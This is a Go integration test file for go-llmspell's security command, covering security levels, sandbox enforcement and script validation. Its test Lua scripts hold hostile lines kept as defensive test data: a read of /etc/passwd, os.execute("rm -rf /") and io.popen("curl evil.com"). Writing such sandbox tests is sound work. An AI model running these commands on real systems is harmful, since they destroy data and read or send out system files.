// ABOUTME: Integration tests for the security command verifying security level and feature set management.
// ABOUTME: Tests security level listing, viewing, and enforcement.

package commands

import (
	"testing"

	"github.com/lexlapax/go-llmspell/tests/integration/helpers"
	"github.com/stretchr/testify/assert"
)

func TestSecurityCommand(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping integration test in short mode")
	}

	h := helpers.NewTestHelper(t)
	defer h.Cleanup()

	t.Run("list security levels", func(t *testing.T) {
		stdout, stderr, err := h.RunCommand("security", "list")

		h.AssertSuccess(stdout, stderr, err)
		// Should list all available security levels
		h.AssertOutput(stdout, "untrusted")
		h.AssertOutput(stdout, "trusted")
		h.AssertOutput(stdout, "privileged")
	})

	t.Run("view specific security level", func(t *testing.T) {
		stdout, stderr, err := h.RunCommand("security", "show", "untrusted")

		h.AssertSuccess(stdout, stderr, err)
		// Should show security level details
		h.AssertOutput(stdout, "untrusted")
		h.AssertOutput(stdout, "Filesystem:")
		h.AssertOutput(stdout, "Network:")
		h.AssertOutput(stdout, "Execute:")
	})

	t.Run("view trusted security level", func(t *testing.T) {
		stdout, stderr, err := h.RunCommand("security", "show", "trusted")

		h.AssertSuccess(stdout, stderr, err)
		h.AssertOutput(stdout, "trusted")
		// Trusted should be more permissive than untrusted
		assert.Contains(t, stdout, "Filesystem: true") // File system access
	})

	// Note: Feature sets are shown as part of security level details
	// so no separate "list feature sets" command is needed


	t.Run("view privileged security level", func(t *testing.T) {
		stdout, stderr, err := h.RunCommand("security", "show", "privileged")

		h.AssertSuccess(stdout, stderr, err)
		h.AssertOutput(stdout, "privileged")
		// Privileged should have all permissions enabled
		assert.Contains(t, stdout, "Unsafe: true") // Most permissive access
	})

	t.Run("validate security level", func(t *testing.T) {
		stdout, stderr, err := h.RunCommand("security", "validate", "untrusted")

		h.AssertSuccess(stdout, stderr, err)
		h.AssertOutput(stdout, "valid")
	})

	t.Run("invalid security level name", func(t *testing.T) {
		stdout, stderr, err := h.RunCommand("security", "show", "non-existent")

		h.AssertFailure(stdout, stderr, err)
		// The error message will be different with the new structure
		assert.NotEmpty(t, stderr)
	})

	// The "check" and "compare" actions are not implemented in the new security command
	// These tests are no longer valid
	// t.Run("check permissions for security level", func(t *testing.T) {
	// 	stdout, stderr, err := h.RunCommand("security", "check", "untrusted", "file_read")
	//
	// 	h.AssertSuccess(stdout, stderr, err)
	// 	// Should indicate if permission is allowed
	// 	output := stdout + stderr
	// 	assert.Contains(t, output, "denied") // Untrusted denies file operations
	// })

	// t.Run("compare security levels", func(t *testing.T) {
	// 	stdout, stderr, err := h.RunCommand("security", "compare", "untrusted", "trusted")
	//
	// 	h.AssertSuccess(stdout, stderr, err)
	// 	// Should show differences
	// 	h.AssertOutput(stdout, "untrusted")
	// 	h.AssertOutput(stdout, "trusted")
	// 	h.AssertOutput(stdout, "file_system")
	// 	h.AssertOutput(stdout, "network")
	// })

	// The "export" action is not implemented in the new security command
	// This test is no longer valid
	// t.Run("export security configuration", func(t *testing.T) {
	// 	stdout, stderr, err := h.RunCommand("security", "export", "untrusted", "minimal")
	//
	// 	h.AssertSuccess(stdout, stderr, err)
	// 	// Should output YAML representation
	// 	h.AssertOutput(stdout, "security_level: untrusted")
	// 	h.AssertOutput(stdout, "feature_set: minimal")
	// 	h.AssertOutput(stdout, "file_system:")
	// 	h.AssertOutput(stdout, "network:")
	// })

	t.Run("verbose security level info", func(t *testing.T) {
		stdout, stderr, err := h.RunCommand("security", "show", "untrusted", "--verbose")

		h.AssertSuccess(stdout, stderr, err)
		// Verbose mode should show more details
		h.AssertOutput(stdout, "untrusted")
		output := stdout + stderr
		assert.Contains(t, output, "Security Level") // Should include detailed info
	})
}

func TestSecurityEnforcement(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping integration test in short mode")
	}

	h := helpers.NewTestHelper(t)
	defer h.Cleanup()

	t.Run("run with untrusted security level", func(t *testing.T) {
		// Create a script that tries to access file system
		script := h.CreateSpell("security-test.lua", `
			-- Try to read a file (should be blocked with untrusted security)
			if io and io.open then
				local file = io.open("/etc/passwd", "r")
				if file then
					return "SECURITY BREACH: File access allowed!"
				else
					return "File access properly blocked"
				end
			else
				return "File access properly blocked"
			end
		`)

		stdout, stderr, err := h.RunCommand("run", script, "--security-level", "untrusted", "--feature-set", "minimal")

		// Script should run but file access should be blocked
		h.AssertSuccess(stdout, stderr, err)
		h.AssertOutput(stdout, "File access properly blocked")
		h.AssertNotOutput(stdout, "SECURITY BREACH")
	})

	t.Run("run with trusted security level", func(t *testing.T) {
		// Create a script that uses trusted features
		script := h.CreateSpell("dev-test.lua", `
			-- Trusted security level allows more access
			return "Trusted mode active"
		`)

		stdout, stderr, err := h.RunCommand("run", script, "--security-level", "trusted", "--feature-set", "full")

		h.AssertSuccess(stdout, stderr, err)
		h.AssertOutput(stdout, "Trusted mode active")
	})

	t.Run("validate script against security level", func(t *testing.T) {
		// Create a script with potential security issues
		script := h.CreateSpell("risky.lua", `
			os.execute("rm -rf /")  -- Dangerous!
			io.popen("curl evil.com")  -- Network access
		`)

		stdout, stderr, _ := h.RunCommand("validate", script, "--security-level", "untrusted", "--feature-set", "minimal")

		// Validation should warn about security issues
		output := stdout + stderr
		assert.Contains(t, output, "Forbidden pattern") // Security validation message
		assert.Contains(t, output, "os\\.execute")     // Should identify risky calls (escaped in regex)
	})

	t.Run("profile from config", func(t *testing.T) {
		// Create config with default profile
		config := h.CreateConfigFile(`
security:
  profile: production
`)

		// Create a simple script
		script := h.CreateSpell("config-profile.lua", `
			return "Using profile from config"
		`)

		stdout, stderr, err := h.RunCommand("run", script, "--config", config)

		h.AssertSuccess(stdout, stderr, err)
		// Should use production profile from config
		h.AssertOutput(stdout, "Using profile from config")
	})
}
